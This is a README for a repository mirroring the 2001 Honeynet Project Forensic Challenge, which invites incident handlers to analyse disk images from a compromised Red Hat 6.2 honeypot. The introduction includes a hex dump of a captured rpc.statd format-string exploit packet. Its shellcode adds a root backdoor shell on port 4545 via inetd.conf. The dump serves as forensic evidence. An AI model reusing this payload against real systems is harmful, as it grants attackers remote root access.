.. image:: images/page_titles_for_challenge.jpg

===================================
Honeynet Project Forensic Challenge
===================================

This repository mirrors and repackages the original data and analyses
from the Honeynet Project `Forensic Challenge`_.

You can read about the Honeynet Project Forensic Challenge in the article
`Tales from the CRYPT(3): Stories from the early Honeynet Project years (1999 to 2005)
<https://medium.com/@dave.dittrich/tales-from-the-crypt-3-ca8801b9f725>`_.

.. note::

    If you just want to get the image files, skip to `Getting Just Image Files`_

The Forensic Challenge
----------------------

The Honeynet Project's **Forensic Challenge** was launched on January 15, 2001.
This page links to all the information we've assembled about the Challenge.
This index will help you quickly get to what you want.

-  Introduction_
-  `The Challenge`_
-  `The Rules`_
-  `Partition images <partition-images/>`__
-  `Frequently Asked Questions about the Challenge <faq/>`__
-  `Results of the Challenge <results/>`__

.. _intro:

Introduction
~~~~~~~~~~~~

Every day, incident handlers across the globe are faced with compromised
systems, running some set of unknown programs, providing some kind of
unintended service to an intruder who has taken control of someone else's --
YOUR, or your client's, or customer's -- computers. To most, the response is a
matter of "get it back online ASAP and be done with it." This usually leads to
an inadequate and ineffective response, not even knowing what hit you, with a
high probability of repeated compromise.

On the law enforcement side, they are hampered by a flood of incidents and a
lack of good data. A victim trying to keep a system running or doing a
"quickie" job of cleanup usually means incidents are underreported and
inadequate handling of the evidence leads to no evidence, or tainted evidence.
There has to be a better way to meet the needs of incident handlers and system
administrators, as well as law enforcement, if Internet crime is going to be
managed and not run amok. One possible answer is effective forensic analysis
skills -- widespread knowledge of tools and techniques -- to preserve data,
analyze it, and produce meaningful reports and damage estimates to your
organization's management, to other incident response teams and system
administrators, and to law enforcement.

Enter the Honeynet Project. One of the primary goals of the Honeynet Project is
to find order in chaos by letting the attackers do their thing, and allowing
the defenders to learn from the experience and improve. The latest challenge,
inspired by the Honeynet Project's founder Lance Spitzner, is the Forensic
Challenge. Only this time, we're opening it up to anyone who wants to join in.

The Challenge
~~~~~~~~~~~~~

The Forensic Challenge is an effort to allow incident handlers around the world
to all look at the same data -- an image reproduction of the same compromised
system -- and to see who can dig the most out of that system and communicate
what they've found in a concise manner. This is a nonscientific study of tools,
techniques, and procedures applied to postcompromise incident handling. The
challenge is to have fun, to solve a common real world problem, and for
everyone to learn from the process. If what I've said already isn't enough to
get you interested, Foundstone is generously offering copies of their extremely
popular "Hacking Exposed" (Second Edition) book for the 20 best submissions.

To get you started, here are the basic facts about the compromise:

-  The system was running a default Red Hat Linux 6.2 Server
   installation.
-  The system's time zone was set to GMT-0600 (CST).
-  The following was noted and logged by the Project's IDS of
   choice, `snort <http://www.snort.org>`__.

::

   Nov 7 23:11:06 lisa snort[1260]:
   RPC Info Query: 216.216.74.2:963 -> 172.16.1.107:111

   Nov 7 23:11:31 lisa snort[1260]:
   spp_portscan: portscan status from 216.216.74.2: 2 connections across 1 hosts: TCP(2), UDP(0)

   Nov 7 23:11:31 lisa snort[1260]:
   IDS08 - TELNET - daemon-active: 172.16.1.101:23 -> 216.216.74.2:1209

   Nov 7 23:11:34 lisa snort[1260]:
   IDS08 - TELNET - daemon-active: 172.16.1.101:23 -> 216.216.74.2:1210

   Nov 7 23:11:47 lisa snort[1260]:
   spp_portscan: portscan status from 216.216.74.2: 2 connections across 2 hosts: TCP(2), UDP(0)

   Nov 7 23:11:51 lisa snort[1260]:
   IDS15 - RPC - portmap-request-status: 216.216.74.2:709 -> 172.16.1.107:111

   Nov 7 23:11:51 lisa snort[1260]:
   IDS362 - MISC - Shellcode X86 NOPS-UDP: 216.216.74.2:710 -> 172.16.1.107:871

::

   11/07-23:11:50.870124 216.216.74.2:710 -> 172.16.1.107:871
   UDP TTL:42 TOS:0x0 ID:16143
   Len: 456
   3E D1 BA B6 00 00 00 00 00 00 00 02 00 01 86 B8  >...............
   00 00 00 01 00 00 00 02 00 00 00 00 00 00 00 00  ................
   00 00 00 00 00 00 00 00 00 00 01 67 04 F7 FF BF  ...........g....
   04 F7 FF BF 05 F7 FF BF 05 F7 FF BF 06 F7 FF BF  ................
   06 F7 FF BF 07 F7 FF BF 07 F7 FF BF 25 30 38 78  ............%08x
   20 25 30 38 78 20 25 30 38 78 20 25 30 38 78 20   %08x %08x %08x
   25 30 38 78 20 25 30 38 78 20 25 30 38 78 20 25  %08x %08x %08x %
   30 38 78 20 25 30 38 78 20 25 30 38 78 20 25 30  08x %08x %08x %0
   38 78 20 25 30 38 78 20 25 30 38 78 20 25 30 38  8x %08x %08x %08
   78 20 25 30 32 34 32 78 25 6E 25 30 35 35 78 25  x %0242x%n%055x%
   6E 25 30 31 32 78 25 6E 25 30 31 39 32 78 25 6E  n%012x%n%0192x%n
   90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90  ................
   90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90  ................
   90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90  ................
   90 90 EB 4B 5E 89 76 AC 83 EE 20 8D 5E 28 83 C6  ...K^.v... .^(..
   20 89 5E B0 83 EE 20 8D 5E 2E 83 C6 20 83 C3 20   .^... .^...  ..
   83 EB 23 89 5E B4 31 C0 83 EE 20 88 46 27 88 46  ..#.^.1... .F'.F
   2A 83 C6 20 88 46 AB 89 46 B8 B0 2B 2C 20 89 F3  *.. .F..F..+, ..
   8D 4E AC 8D 56 B8 CD 80 31 DB 89 D8 40 CD 80 E8  .N..V...1...@...
   B0 FF FF FF 2F 62 69 6E 2F 73 68 20 2D 63 20 65  ..../bin/sh -c e
   63 68 6F 20 34 35 34 35 20 73 74 72 65 61 6D 20  cho 4545 stream
   74 63 70 20 6E 6F 77 61 69 74 20 72 6F 6F 74 20  tcp nowait root
   2F 62 69 6E 2F 73 68 20 73 68 20 2D 69 20 3E 3E  /bin/sh sh -i >>
   20 2F 65 74 63 2F 69 6E 65 74 64 2E 63 6F 6E 66   /etc/inetd.conf
   3B 6B 69 6C 6C 61 6C 6C 20 2D 48 55 50 20 69 6E  ;killall -HUP in
   65 74 64 00 00 00 00 09 6C 6F 63 61 6C 68 6F 73  etd.....localhos
   74 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  t...............
   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................

A bit-image copy of the active partitions was obtained, as detailed here:

::

   /dev/hda8       /
   /dev/hda1       /boot
   /dev/hda6       /home
   /dev/hda5       /usr
   /dev/hda7       /var
   /dev/hda9       swap

MD5 Checksums (both uncompressed and GNU gzip compressed):

::

   a1dd64dea2ed889e61f19bab154673ab  honeypot.hda1.dd
   c1e1b0dc502173ff5609244e3ce8646b  honeypot.hda5.dd
   4a20a173a82eb76546a7806ebf8a78a6  honeypot.hda6.dd
   1b672df23d3af577975809ad4f08c49d  honeypot.hda7.dd
   8f244a87b8d38d06603396810a91c43b  honeypot.hda8.dd
   b763a14d2c724e23ebb5354a27624f5f  honeypot.hda9.dd

   f8e5cdb6f1109035807af1e141edd76d  honeypot.hda1.dd.gz
   6ef29886be0d9140ff325fe463fce301  honeypot.hda5.dd.gz
   8eb98a676dbffad563896a9b1e99a95f  honeypot.hda6.dd.gz
   be215f3e8c2602695229d4c7810b9798  honeypot.hda7.dd.gz
   b4ff10d5fd1b889a6237fa9c2979ce77  honeypot.hda8.dd.gz
   9eed26448c881b53325a597eed8685ea  honeypot.hda9.dd.gz

Please be aware that these are new images. This is **not** a system that the
Honeynet Project has previously written about or discussed publically. (I.e.,
you won't get any hints from previous Honeynet papers.) The images were edited
to anonymize the system. Only the hostname was modified. Everyone is using the
same data, so any anomalies caused by this editing will be identical.

The image files can be mounted on Linux systems using the loopback interface
like this:

::

    # mkdir /t
    # mount -o ro,loop,nodev,noexec honeypot.hda8.dd /t
    # mount -o ro,loop,nodev,noexec honeypot.hda1.dd /t/boot
    [ etc... ]

Its now your job -- should you choose to accept it! -- to figure out the Who,
What, Where, When, How, and maybe even the Why of this compromise. We don't
expect that everyone undertaking the challenge can or will address all of the
following items, but the list below of questions and deliverables is provided
as a guideline for what to produce and what to focus on:

#. Identify the intrusion method, its date, and time. (Assume the clock on
   the IDS was synchronized with an NTP reference time source.)

#. Identify as much as possible about the intruder(s).

#. List all the files that were added/modified by the intruder.  Provide
   an analysis of these programs (including decompilation or disassembly
   where necessary to determine their function and role in the incident.)

#. Was there a sniffer or password harvesting program installed?
   If so, where and what files are associated with it?

#. Was there a "rootkit" or other post-concealment trojan horse programs
   installed on the system? If so, what operating system programs were
   replaced and how could you get around them? Hint: If you don't know
   what a "rootkit" is, read this:
   `http://staff.washington.edu/dittrich/misc/faqs/rootkits.faq
   <https://staff.washington.edu/dittrich/misc/faqs/rootkits.faq>`__

#. What is publicly known about the source of any programs found on the
   system? (e.g., their authors, where source code can be found, what
   exploits or advisories exist about them, etc.)

#. Build a time line of events and provide a detailed analysis of activity
   on the system, noting sources of supporting or confirming evidence
   (elsewhere on the system or compared with a known "clean" system of
   similar configuration.)

#. Provide a report suitable for management or news media (general aspects
   of the intrusion without specific identifying data).

#. Provide an advisory for use within the home organization (a fictitious
   university, "honeyp.edu", in this case, where I hold an honorary Doctorate,
   by the way) to explain the key aspects of the vulnerability exploited,
   how to detect and defend against this vulnerability, and how to
   determine whether or not other systems were similarly compromised.

#. Produce a cost-estimate for this incident using the following guidelines
   and method: 

   `http://staff.washington.edu/dittrich/misc/faqs/incidentcosts.faq
   <https://staff.washington.edu/dittrich/misc/faqs/incidentcosts.faq>`__

   To simplify and to normalize the results, assume that your annual salary is
   $70,000 and that there are no user-related costs. (If you work as a team,
   break out hours by person, but all members should use the same annual
   salary. Please also include a brief description of each investigator's
   number of years of experience in the fields of system administration,
   programming, and security, just to help us compare the number of hours spent
   with other entrants).

To summarize (and standardize) the deliverables, please produce the following:

::

      File                   Contents
      -----------------------------------------------------------------------
      index.txt              Index of files/directories submitted (including
                             any not listed below.)

      timestamp.txt          Timestamp of MD5 checksums of all files listed
                             and submitted (dating when produced -- see
                             deadline information below.)

      costs.txt              Incident cost-estimate.

      evidence.txt           Time line and detailed (technical) analysis. (Use
                             an Appendix, and/or mark answers to questions
                             above with "[Q1]", etc.)

      summary.txt            Management and media (non-technical) summary.

      advisory.txt           Advisory for consumption by other system
                             administrators and incident handlers within your
                             organization.

      files.tar              Any other files produced during analysis and/or
                             excerpts (e.g., strings output or dissassembly
                             listings) from files on the compromised file
                             system, which are referenced in the previous files.

The Rules
~~~~~~~~~

-  You are free to use any tools or techniques that you choose, provided that
   the judges are able to readily interpret your results and duplicate or verify
   their accuracy using publicly available means (i.e., don't expect us all to
   have a copy of your favorite "Law Enforcement Only" or multi-hundred dollar
   commercial Windows-only tool). A good publicly available free
   forensic toolkit is `TASK <https://www.sleuthkit.org>`__ (made up of
   `Autopsy <https://www.sleuthkit.org/autopsy/download.php>`__ and
   `The Sleuth Kit <https://www.sleuthkit.org/sleuthkit/download.php>`__.
   These tools build on Dan Farmer and Wietse Venema's original `The
   Coroner's Toolkit (TCT)
   <http://www.porcupine.org/forensics/tct.html>`__. If you want
   examples of the use of TCT, or other tools/techniques, see the Forensics
   section of the following web page:

   `https://davedittrich.github.io/ <https://davedittrich.github.io/>`__

   No matter what tools/methods you choose, please make sure you explain them
   in your analysis and cite references to resources (e.g., RFCs, CERT or
   SANS "how to" documents) to help others learn by example. Don't forget:
   this is a Honeynet Project brainchild, so learning is what it's all about.
   And fun. It's all about learning and fun. Oh yeah, and security. Learning,
   fun, AND security. ;)

-  You may work as a team, but if your entry is selected as a Top 20, you'll
   have to fight over one copy of the book.

-  Deliver the results of the analysis in such a way that the judges can quickly
   and easily consume the information, and such that its authenticity, time of
   production, and integrity can be verified independently. (e.g., ISO 9660
   CD-ROM or ``.tar`` archive, with digital time stamps, and PGP signatures
   and/or MD5 checksums.) Please DO NOT SEND COPIES OF COMPLETE FILES FROM THE
   FILE SYSTEM. We already have a copy of the file system and its contents.
   Just note the path (e.g., "[See file /bin/foo]").

-  All submissions **MUST** be time stamped prior to 00:00 GMT on Monday,
   February 19, 2001 [**not** February 15 as the announcement email said], and
   delivery to the judges initiated later that same day. (This is to accommodate
   submissions on IS0 9660 format CD-ROM, which should be postmarked by this
   time. The digital time stamps and postmarks will be used to determine the
   20 "Hacking Exposed" book winners.) One free digital time stamping service
   you can use is `Stamper <http://www.itconsult.co.uk/stamper.htm>`__ .

-  The person who hacked the box is NOT eligible, nor are members of the
   Honeynet Project. Members of the companies employing Honeynet Project members
   are eligible (and encouraged!) to enter, but their entries (even if Top 20)
   will not receive copies of "Hacking Exposed." The books go to other entrants.

-  Entries must be written in English (UK and Aussie English accepted, but go
   light on the regional slang, please! I only have a copy of "*Best of Aussie
   Slang*," and the other judges don't live in Seattle.)

-  Only one entry per household, please. Must be sentient to enter. Sorry, no
   Ginsu Knives come with this offer!

Submissions will be judged by a panel of experts and winners selected and
announced on Monday, March 19, 2001. All decisions of the judges are final (no
recounts or legal challenges by teams of grossly overpaid lawyers will be
tolerated!).

After the winners are announced, all entries will be posted for the security
community to review. We hope that the community can better learn from and
improve from all the different techniques that different people and
organizations use.

Also, we wouldn't be the Honeynet Project if we didn't capture all of the
blackhat's keystrokes as he exploited, accessed, and modified the honeypot! We
will release the Honeypot Project's analysis of the hacked system, as well as
the blackhat's keystrokes, along with the results of the Challenge on March 19.

Good luck, and have fun!

Dave Dittrich

.. |spacer| image:: /images/spacer.gif
   :width: 200px
   :height: 100px
.. |Home| image:: /images/nav_00_home.gif
   :name: home
   :width: 129px
   :height: 28px
   :target: /index.html
.. |About the Project| image:: /images/nav_01_about.gif
   :name: about
   :width: 129px
   :height: 28px
   :target: /misc/project.html
.. |Challenges| image:: /images/nav_04_challenges.gif
   :name: challenges
   :width: 129px
   :height: 30px
   :target: /misc/chall.html
.. |Presentations| image:: /images/nav_05_presentations.gif
   :name: pres
   :width: 129px
   :height: 31px
   :target: /speaking/index.html
.. |Whitepapers| image:: /images/nav_06_whitepapers.gif
   :name: white
   :width: 129px
   :height: 30px
   :target: /papers/index.html
.. |Tools| image:: /images/nav_07_tools.gif
   :name: tools
   :width: 129px
   :height: 30px
   :target: /tools/index.html
.. |Our Book| image:: /images/nav_08_our_book.gif
   :name: book
   :width: 129px
   :height: 29px
   :target: /book/index.html
.. |Funding/Donations| image:: /images/nav_09_funding.gif
   :name: fund
   :width: 129px
   :height: 31px
   :target: /funds/index.html
.. |Status Reports| image:: /images/nav_status.gif
   :name: status
   :width: 129px
   :height: 31px
   :target: /status/index.html
.. |Mirrors| image:: /images/nav_10_mirrors.gif
   :name: mirrors
   :width: 129px
   :height: 28px
   :target: /misc/mirror.html
.. |spacer| image:: /images/spacer.gif
   :width: 19px
   :height: 5px
.. |spacer| image:: /images/spacer.gif
   :width: 5px
   :height: 50px
.. |The Forensic Challenge| image:: /images/page_titles_for_challenge.jpg
   :width: 350px
   :height: 36px
.. |spacer| image:: /images/spacer.gif
   :width: 1px
   :height: 3px
.. |Back to Top| image:: /images/back.gif
   :width: 82px
   :height: 20px
   :target: #top

Getting Just Image Files
------------------------

If you only want to get the uncompressed partition image files to
perform forensic analysis on them, you can use the script
``get-images-only.sh`` to do that.

.. code-block:: shell

   $ wget -q https://raw.githubusercontent.com/davedittrich/forensic-challenge/master/get-images-only.sh
   $ less get-images-only.sh   # I will *not* suggest you pipe this to sh! Bad Practice! Bad!

..

When you are satisfied the script is safe, run it giving a path for a
new directory that will contain just the raw partition images.

.. code-block:: shell

   $ bash get-images-only.sh /tmp/forensic-challenge
   [+] Creating directory /tmp/forensic-challenge
   [+] Sparse cloning repo https://github.com/davedittrich/forensic-challenge.git
   Updating origin
   remote: Enumerating objects: 234, done.
   remote: Counting objects: 100% (234/234), done.
   remote: Compressing objects: 100% (183/183), done.
   remote: Total 234 (delta 58), reused 222 (delta 46), pack-reused 0
   Receiving objects: 100% (234/234), 145.27 MiB | 4.47 MiB/s, done.
   Resolving deltas: 100% (58/58), done.
   From https://github.com/davedittrich/forensic-challenge
    * [new branch]      master     -> origin/master
   From https://github.com/davedittrich/forensic-challenge
    * branch            master     -> FETCH_HEAD
   [+] Decompressing partition images:
   [+]   honeypot.hda1.dd.bz2...done.
   [+]   honeypot.hda6.dd.bz2...done.
   [+]   honeypot.hda7.dd.bz2...done.
   [+]   honeypot.hda8.dd.bz2...done.
   [+]   honeypot.hda9.dd.bz2...done.
   [+]   honeypot.hda5.dd.bz2...done.
   [+] Verifying integrity of decompressed files in /tmp/forensic-challenge:
   honeypot.hda1.dd: OK
   honeypot.hda5.dd: OK
   honeypot.hda6.dd: OK
   honeypot.hda7.dd: OK
   honeypot.hda8.dd: OK
   honeypot.hda9.dd: OK

..

Credits
---------

The original Honeynet Project `Forensic Challenge`_ web site
is http://old.honeynet.org/challenge/

.. _Forensic Challenge: http://old.honeynet.org/challenge/
